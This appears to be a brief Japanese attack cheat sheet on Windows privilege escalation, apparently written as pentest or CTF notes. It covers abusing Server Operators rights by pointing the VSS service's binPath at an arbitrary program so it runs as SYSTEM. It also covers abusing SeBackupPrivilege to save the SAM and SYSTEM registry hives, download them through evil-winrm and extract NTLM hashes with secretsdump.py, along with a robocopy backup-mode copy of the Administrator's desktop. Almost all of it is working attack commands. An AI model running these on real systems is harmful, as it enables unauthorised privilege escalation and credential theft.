# Server Operatorsの悪用
今回はVSS(Volume Shadow Copy Service)という標準的なWindowsサービスをターゲットに、binPath(サービス起動時に実行するプログラム)を書き換える。  
VSSサービスは通常、SYSTEMアカウントの権限で実行されるため権限昇格が可能。
```bash
sc.exe query vss # vssの確認
sc.exe config vss binPath="<任意のパス>" # binPathの変更
sc.exe stop vss
sc.exe start vss
```

# SeBackupPrivilegeの悪用
```bash
reg save hklm\sam sam
reg save hklm\system system
download sam # evil-winrm
download system # evil-winrm
# kali
secretsdump.py -sam sam -system system local # NTLMハッシュの取得

# robocopyの使用
robocopy /b C:\Users\Administrator\Desktop\ C:\ # 管理者のデスクトップ配下をCドライブに移動
```
